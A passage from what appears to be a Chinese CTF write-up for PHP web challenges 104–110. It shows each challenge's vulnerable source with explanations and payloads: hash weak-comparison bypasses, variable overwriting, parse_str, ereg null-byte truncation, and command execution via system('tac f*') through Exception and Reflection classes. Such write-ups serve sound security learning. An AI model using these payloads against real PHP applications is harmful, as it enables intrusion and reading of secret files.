class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>sha1跟md5类似，都无法处理数组，且存在&#x3D;&#x3D;弱比较，所以可以用数组绕过</strong></p><p><strong>0e绕过，当sha1处理字符串后如果出现0exxx这种数据，在弱类型比较中都会等于0所以能相等</strong></p><p><strong>但是这题只要填两个相同字符串就能过，有点逆天</strong></p><p>payload：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">POST</span>：<span class="hljs-built_in">v1</span>[]<span class="hljs-number">=0</span>  <br>?<span class="hljs-built_in">v2</span>[]<span class="hljs-number">=1</span>   <br><br><span class="hljs-symbol">POST</span>：<span class="hljs-built_in">v1</span><span class="hljs-symbol">=aaK1STfY</span>   <span class="hljs-comment">//0e76658526655756207688271159624026011393</span><br>?<span class="hljs-built_in">v2</span><span class="hljs-symbol">=aaO8zKZF</span>   <span class="hljs-comment">//0e89257456677279068558073954252716165668</span><br><br>逆天<br><span class="hljs-symbol">POST:</span> <span class="hljs-built_in">v1</span><span class="hljs-number">=1</span><br>?<span class="hljs-built_in">v2</span><span class="hljs-number">=1</span><br></code></pre></td></tr></table></figure><hr><h3 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h3><p><a href="https://www.php.net/manual/zh/function.sha1.php">sha1详解</a></p><p>sha1 — 计算字符串的 sha1 散列</p><p><strong>sha1</strong>(string <code>$string</code>, bool <code>$binary</code> &#x3D; <strong><code>false</code></strong>): </p><p>以字符串形式返回 sha1 散列值。</p><p>绕过方法：不能处理数组，而且能构造出0exxxx类型数据，能绕过弱类型比较</p><hr><h2 id="web-105（变量覆盖、die）"><a href="#web-105（变量覆盖、die）" class="headerlink" title="web-105（变量覆盖、die）"></a>web-105（变量覆盖、die）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$error</span>=<span class="hljs-string">&#x27;你还想要flag嘛？&#x27;</span>;<br><span class="hljs-variable">$suces</span>=<span class="hljs-string">&#x27;既然你想要那给你吧！&#x27;</span>;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span>===<span class="hljs-string">&#x27;error&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you doing?!&quot;</span>);<span class="hljs-comment">//键名不能是error</span><br>    &#125;<br>    <span class="hljs-variable">$$key</span>=<span class="hljs-variable">$$value</span>;<span class="hljs-comment">//变量覆盖，意思就是$key的内容作为变量，例如：$key=xx，$$key=$xx</span><br>    就是把你传入的值给弄成变量<br>&#125;<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$value</span>===<span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you doing?!&quot;</span>);<span class="hljs-comment">//键值不能是flag</span><br>    &#125;<br>    <span class="hljs-variable">$$key</span>=<span class="hljs-variable">$$value</span>;<span class="hljs-comment">//变量覆盖</span><br>&#125;<br><span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-variable">$flag</span>))&#123;<span class="hljs-comment">//不相等就die($error)</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$error</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your are good&quot;</span>.<span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">die</span>(<span class="hljs-variable">$suces</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解题思路：</p><p>有两个地方有变量覆盖，有两个die函数输出，最后一个die函数要用的话，必须设置flag，但是设置flag后就只有进行变量覆盖了，所以只能用第一个die函数里的error，需要考虑怎么通过变量覆盖使变量error和变量flag相等，还需要借助变量suces</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs swift">当<span class="hljs-keyword">get</span> 方式传入suces<span class="hljs-operator">=</span>flag,<span class="hljs-variable">$key</span><span class="hljs-operator">=</span>suces，<span class="hljs-variable">$value</span><span class="hljs-operator">=</span>flag <br>foreach(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> <span class="hljs-operator">=&gt;</span> <span class="hljs-variable">$value</span>)&#123;<br>    $<span class="hljs-variable">$key</span><span class="hljs-operator">=</span>$<span class="hljs-variable">$value</span>;    #变成了<span class="hljs-variable">$suces</span><span class="hljs-operator">=</span><span class="hljs-variable">$flag</span>,<span class="hljs-variable">$suces的值是flag的值</span><br> &#125;<br>当post传入error<span class="hljs-operator">=</span>suces,<span class="hljs-variable">$key</span><span class="hljs-operator">=</span>error,<span class="hljs-variable">$value</span><span class="hljs-operator">=</span>suces<br>foreach(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> <span class="hljs-operator">=&gt;</span> <span class="hljs-variable">$value</span>)&#123;<br>    $<span class="hljs-variable">$key</span><span class="hljs-operator">=</span>$<span class="hljs-variable">$value</span>;  #变成了<span class="hljs-variable">$error</span><span class="hljs-operator">=</span><span class="hljs-variable">$flag</span>,<span class="hljs-variable">$error的值是flag的值</span><br>&#125;<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">触发die(<span class="hljs-variable">$error</span>)来输出flag<br>?<span class="hljs-attribute">suces</span>=flag<br>post：<span class="hljs-attribute">error</span>=suces<br><br>?<span class="hljs-attribute">suces</span>=flag&amp;flag=1注意，`$&lt;常量&gt;=<span class="hljs-literal">null</span>`<br>post：flag=<br><br>或者也可以使用下面的echo来输出flag<br>?<span class="hljs-attribute">suces</span>=flag<br>post：<span class="hljs-attribute">error</span>=suces&amp;flag=<br>这里<span class="hljs-variable">$flag</span>在第二次循环时会被覆盖为空，从而脱离最后一个<span class="hljs-keyword">if</span>判断，最后触发echo<br></code></pre></td></tr></table></figure><hr><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>变量覆盖是把变量的值当作另一个变量的名</p><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;b&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;c&#x27;</span>;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$a&#x27;</span>;<span class="hljs-comment">#b</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$b&#x27;</span>;<span class="hljs-comment">#c</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$$a&#x27;</span> <span class="hljs-comment">#c</span><br></code></pre></td></tr></table></figure><hr><h3 id="die"><a href="#die" class="headerlink" title="die()"></a>die()</h3><p>PHP 中的 die() 函数是一个终止脚本执行的函数，它会立即结束当前正在运行的脚本，并可选地输出一条错误信息（可以输出变量）</p><p><strong>用法</strong></p><p>die() 函数的语法如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">die</span><span class="hljs-params">(message)</span></span><br></code></pre></td></tr></table></figure><p>参数 message 是一个可选的字符串，将作为错误信息在脚本终止前显示。如果没有提供错误信息，则不会显示任何内容。</p><hr><h2 id="web-106（sha1数组绕过）"><a href="#web-106（sha1数组绕过）" class="headerlink" title="web-106（sha1数组绕过）"></a>web-106（sha1数组绕过）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v1</span>)==<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v2</span>) &amp;&amp; <span class="hljs-variable">$v1</span>!=<span class="hljs-variable">$v2</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解题思路：</p><p>我怀疑104出错了，这题才是对的，解题思路就不重写了，就在104，比104多了个$v1!&#x3D;$v2</p><p>payload：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">POST</span>：<span class="hljs-built_in">v1</span>[]<span class="hljs-number">=0</span>  <br>?<span class="hljs-built_in">v2</span>[]<span class="hljs-number">=1</span>   <br><br><span class="hljs-symbol">POST</span>：<span class="hljs-built_in">v1</span><span class="hljs-symbol">=aaK1STfY</span>   <span class="hljs-comment">//0e76658526655756207688271159624026011393</span><br>?<span class="hljs-built_in">v2</span><span class="hljs-symbol">=aaO8zKZF</span>   <span class="hljs-comment">//0e89257456677279068558073954252716165668</span><br></code></pre></td></tr></table></figure><h2 id="web-107（parse-str-变量覆盖）"><a href="#web-107（parse-str-变量覆盖）" class="headerlink" title="web-107（parse_str()变量覆盖）"></a>web-107（parse_str()变量覆盖）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br>       <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$v1</span>,<span class="hljs-variable">$v2</span>);<br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$v2</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v3</span>))&#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>       &#125;<br><br>&#125;<br><br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解题思路：</p><p>parse_str会将$v1的值赋给$v2</p><p>md5弱比较。<br> 数组绕过，md5不处理数组，返回null，v1不输入业返回null</p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">md5处理数组为<span class="hljs-literal">null</span>，然后parse_str(<span class="hljs-string">&#x27;flag=&#x27;</span>,<span class="hljs-variable">$v2</span>)，<span class="hljs-variable">$v2</span>=<span class="hljs-literal">null</span><br>?v3[]=1<br>post：<span class="hljs-attribute">v1</span>=flag=<br><br>或者<br>因为这里parse_str会将<span class="hljs-variable">$v1</span>的值赋给<span class="hljs-variable">$v2</span><br>所以让v2数组中flag的值等于变量v3的md5值就行了<br>让<span class="hljs-attribute">v1</span>=flag=e80118aff3ed3bc6f99038f65bef881b就可以让 [flag] =&gt; e80118aff3ed3bc6f99038f65bef881b存入到v2数组中<br><br>?<span class="hljs-attribute">v3</span>=harker<br>post:<span class="hljs-attribute">v1</span>=flag=e80118aff3ed3bc6f99038f65bef881b<br></code></pre></td></tr></table></figure><hr><h3 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h3><p><a href="https://www.runoob.com/php/func-string-parse-str.html">parse_str函数详解</a></p><p>parse_str() 函数把查询字符串解析到变量中。</p><p><strong>注释：</strong>如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</p><p><strong>注释：</strong>php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。</p><p>语法：</p><p>parse_str(<em>string,array</em>)</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>string</em></td><td>必需。规定要解析的字符串。</td></tr><tr><td><em>array</em></td><td>可选。规定存储变量的数组名称。该参数指示变量存储到数组中。</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-string">&quot;name=Peter&amp;age=43&quot;</span>,<span class="hljs-variable">$myArray</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$myArray</span>);<br><span class="hljs-meta">?&gt;</span><br><br><br><span class="hljs-title function_ invoke__">Array</span> ( [name] =&gt; Peter [age] =&gt; <span class="hljs-number">43</span> ) <br><br>如果<span class="hljs-keyword">string</span>参数填xxx=后面没有值<br>则<span class="hljs-variable">$myArray</span>[<span class="hljs-string">&#x27;xxx&#x27;</span>]=<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-108（ereg-、-00截断）"><a href="#web-108（ereg-、-00截断）" class="headerlink" title="web-108（ereg()、%00截断）"></a>web-108（ereg()、%00截断）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>])===<span class="hljs-literal">FALSE</span>)  &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br><br>&#125;<br><span class="hljs-comment">//只有36d的人才能看到flag</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))==<span class="hljs-number">0x36d</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>ereg()正则匹配函数，类似preg_match，php7.0已删除。ereg()存在%00截断漏洞，也就是说在字符串中遇到%00，php解析器会认为字符串结束了。而且截断之后，%00后面的值会重新赋值给原来的变量。</strong><br><strong>strrev()反转字符串。</strong><br><strong>&#x3D;&#x3D;弱类型比较支持不同的进制进行比较，就比如16&#x3D;&#x3D;0x10，这是true。</strong></p><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">构造payload让前面的字母被ereg正则匹配（因为正则要求传值中有至少一个字母），然后使用<span class="hljs-variable">%00</span>截断，然后<span class="hljs-variable">%00</span>后面的值会赋值给原来的变量<br>然后会用strrev()反转字符串并且intval处理之后跟<span class="hljs-number">0x36d</span>进行弱类型比较，所以我们只要传<span class="hljs-number">0x36d</span>的十进制数<span class="hljs-number">877</span>，反转之后就是<span class="hljs-number">778</span><br><br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>a<span class="hljs-variable">%00778</span><br></code></pre></td></tr></table></figure><hr><h3 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h3><p><code>ereg()</code>正则匹配函数，类似<code>preg_match</code>，php7.0已删除。<code>ereg()</code>存在%00截断漏洞，也就是说在字符串中遇到%00，php解析器会认为字符串结束了。<strong>而且截断之后，%00后面的值会重新赋值给原来的变量。</strong></p><hr><h3 id="strrev"><a href="#strrev" class="headerlink" title="strrev()"></a>strrev()</h3><p>strrev() ：反转字符串</p><hr><h2 id="web-109（-toString-方法、原生类利用，异常类和反射类）"><a href="#web-109（-toString-方法、原生类利用，异常类和反射类）" class="headerlink" title="web-109（__toString()方法、原生类利用，异常类和反射类）"></a>web-109（__toString()方法、原生类利用，异常类和反射类）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo new <span class="hljs-subst">$v1</span>(<span class="hljs-subst">$v2</span>());&quot;</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解题思路：</p><p>原生类利用，异常类和反射类<br> 类可以输出，就是当类被当作字符串执行，会调用__toString魔术方法，这个类要有这个魔术方法,并且要有返回值才可以输出，这个值要可控</p><p><strong>Exception 处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类</strong><br><strong>通过异常处理类Exception(system(‘cmd’))可以运行指定代码，并且能返回运行的结果</strong><br><strong>ReflectionClass 或者 ReflectionMethod 都为常用的反射类，可以理解为一个类的映射</strong></p><p>payload：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sas">?v1=Exception<span class="hljs-variable">&amp;v2</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&quot;tac f*&quot;</span>)<br><br>?v1=ReflectionClass<span class="hljs-variable">&amp;v2</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&quot;tac f*&quot;</span>)<br><br>?v1=ReflectionMethod<span class="hljs-variable">&amp;v2</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;tac f*&#x27;</span>)<br><br>使用DateTime<br>v1=DateTime<span class="hljs-variable">&amp;v2</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;tac f*&#x27;</span>)<br><br><br>echo new Exceptio<span class="hljs-meta">n</span>(<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;tac f*&#x27;</span>)())<br>会先执行命令<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;tac f*&#x27;</span>)，然后会执行完函数把函数的结果在通过异常进行抛出<br></code></pre></td></tr></table></figure><hr><h3 id="PHP原生类"><a href="#PHP原生类" class="headerlink" title="PHP原生类"></a>PHP原生类</h3><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121780909">php原生类总结</a></p><hr><h3 id="toString-方法"><a href="#toString-方法" class="headerlink" title="__toString()方法"></a>__toString()方法</h3><p>将一个对象作为字符串使用时（<code>echo &lt;一个对象&gt;</code>），php会自动调用该对象的 <code>__toString()</code>方法来获取<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A1%A8%E7%A4%BA&spm=1001.2101.3001.7020">字符串表示</a>。注意，<code>__toString()</code>方法在对象被隐式转换为字符串时（<code>echo &lt;一个对象&gt;</code>）才会触发，如果直接调用该方法，不会有任何效果。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span><br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Object name:&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myclass</span>(<span class="hljs-string">&quot;My Object&quot;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>; <span class="hljs-comment">// 输出对象的字符串表示，自动调用__toString()方法</span><br><span class="hljs-meta">?&gt;</span><br><br>输出<br>Object name:My Object<br></code></pre></td></tr></table></figure><p><strong>php中，自带 <code>__toString()</code>方法的内置类有：<code>DataTime</code>、<code>Exception</code>、<code>SimpleXMLElement</code>。</strong></p><hr><h2 id="web-110（-toString-方法、FilesystemIterator类利用）"><a href="#web-110（-toString-方法、FilesystemIterator类利用）" class="headerlink" title="web-110（__toString()方法、FilesystemIterator类利用）"></a>web-110（__toString()方法、<strong>FilesystemIterator</strong>类利用）</h2><p>源码：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">highlight_file(__FILE__);<br>error_reporting(0);<br>if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;<br>    $v1 = $_GET[&#x27;v1&#x27;];<br>    $v2 = $_GET[&#x27;v2&#x27;];<br><br>    if(preg_match(&#x27;/\~|<span class="hljs-string">\`</span>|<span class="hljs-string">\!</span>|<span class="hljs-string">\@</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\\$</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\(</span>|<span class="hljs-string">\)</span>|<span class="hljs-string">\_</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\;</span>|<span class="hljs-string">\:</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">[0-9]/&#x27;, $v1))&#123;</span><br><span class="hljs-string">            die(&quot;error v1&quot;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    if(preg_match(&#x27;/\~</span>|<span class="hljs-string">\`</span>|<span class="hljs-string">\!</span>|<span class="hljs-string">\@</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\\$</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\*</span>|<span 